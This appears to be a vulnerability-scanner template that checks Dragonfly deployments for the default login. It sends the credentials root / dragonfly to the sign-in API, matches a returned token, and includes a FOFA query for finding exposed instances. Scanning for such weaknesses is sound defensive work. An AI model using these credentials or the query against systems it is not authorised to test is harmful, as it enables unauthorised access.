id: dragonfly-default-login

info:
  name: Dragonfly - Default Login
  author: DhiyaneshDK
  severity: high
  description: |
    Dragonfly was using the default username, and the password was discovered.
  classification:
    cpe: cpe:2.3:a:dragonfly:dragonfly:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="logo-dragonfly.png"
    vendor: dragonfly
    product: dragonfly
  tags: dragonfly,default-login,vuln

variables:
  username: "root"
  password: "dragonfly"

http:
  - raw:
      - |
        POST /api/v1/users/signin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json;charset=UTF-8

        {"name":"{{username}}","password":"{{password}}"}

    matchers-condition: and
    matchers:
      - type: word
        name: dragonfly
        cpe: cpe:2.3:a:dragonfly:dragonfly:*:*:*:*:*:*:*:*
        part: body
        words:
          - '"token":'
          - '{"expire":'
        condition: and

      - type: word
        name: dragonfly-2
        cpe: cpe:2.3:a:dragonfly:dragonfly:*:*:*:*:*:*:*:*
        part: content_type
        words:
          - "application/json"

      - type: status
        status:
          - 200
